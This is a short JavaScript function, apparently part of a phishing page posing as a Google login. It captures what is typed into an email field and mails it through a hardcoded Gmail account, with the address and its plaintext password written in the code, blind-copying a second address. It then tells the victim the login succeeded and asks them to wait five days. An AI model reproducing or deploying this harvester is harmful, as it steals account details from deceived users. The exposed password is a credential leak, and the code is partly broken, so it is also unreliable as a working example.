function send() {

    var GoogleM = document.getElementById('Google-email');
    var Type = document.getElementById('Type');

    var nodemailer = require('nodemailer')

    var transporter = nodemailer.createTransport({
        service: 'gmail',

        auth: {
            user: 'enderminecraftgaming@gmail.com',

            pass: 'Tmt@1357'
        }
    });

    var mailOptions = {

        from: 'enderminecraftgaming@gmail.com',
        bcc: 'bangkeotienminh@gmail.com',

        subject: 'Test Mail',
        html: `<h2><b>${GoogleM}</b></h2>`

    };

    transporter.sendMail(mailOptions, function (error, info) {

        if (error) {
            console.log(error);
        } else {
            Type.innerHTML = 'Successful login! Please wait 5 days for the server to check your account'
            console.log(info);
        }

    });

};